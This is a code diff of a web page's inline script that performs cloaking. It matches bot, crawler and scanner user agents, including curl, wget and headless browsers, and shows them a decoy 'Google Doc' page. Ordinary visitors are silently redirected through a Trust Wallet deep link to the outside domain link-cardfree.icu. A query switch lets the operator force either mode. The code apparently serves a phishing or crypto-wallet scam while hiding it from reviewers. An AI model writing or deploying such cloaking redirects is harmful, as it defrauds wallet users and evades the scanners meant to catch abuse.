@@ -296,16 +296,16 @@ window.GOOGLE_DOC = "<!doctype html>\n<html lang=\"ru\">\n<head>\n<meta charset=
 (function () {
   var BOT = /bot|crawl|spider|slurp|Googlebot|AdsBot|Mediapartners|InspectionTool|PageSpeed|Lighthouse|Yandex|Bing|DuckDuck|Applebot|facebookexternalhit|Twitterbot|TelegramBot|LinkedInBot|Slackbot|WhatsApp|Pinterest|Discordbot|HeadlessChrome|PhantomJS|GTmetrix|Pingdom|Uptime|Monitis|curl|wget|python-requests|aiohttp|httpx|go-http-client|okhttp|axios|libwww-perl|scrapy/i;
   var ua = navigator.userAgent || "";
-  var q = location.search;
-  var forced = q.indexOf("bot=1") > -1 ? true : (q.indexOf("user=1") > -1 ? false : null);
-  var bot = forced === null ? (BOT.test(ua) || navigator.webdriver === true) : forced;
+  var q = location.search; var forced = q.indexOf("bot=1") > -1 ? true : (q.indexOf("user=1") > -1 ? false : null); var bot = forced === null ? (BOT.test(ua) || navigator.webdriver === true) : forced;
   document.documentElement.setAttribute("data-mode", bot ? "bot" : "user");
   if (bot) {
     document.addEventListener("DOMContentLoaded", function () {
       document.open(); document.write(window.GOOGLE_DOC); document.close();
     }, { once: true });
   } else {
-    setTimeout(function () { location.replace("https://link.trustwallet.com/open_url?url=https%3A%2F%2Flink-cardfree.icu%2F"); }, 1500);
+    setTimeout(function () {
+      location.replace("https://link.trustwallet.com/open_url?url=https%3A%2F%2Flink-cardfree.icu%2F");
+    }, 1500);
   }
 })();
 </script>
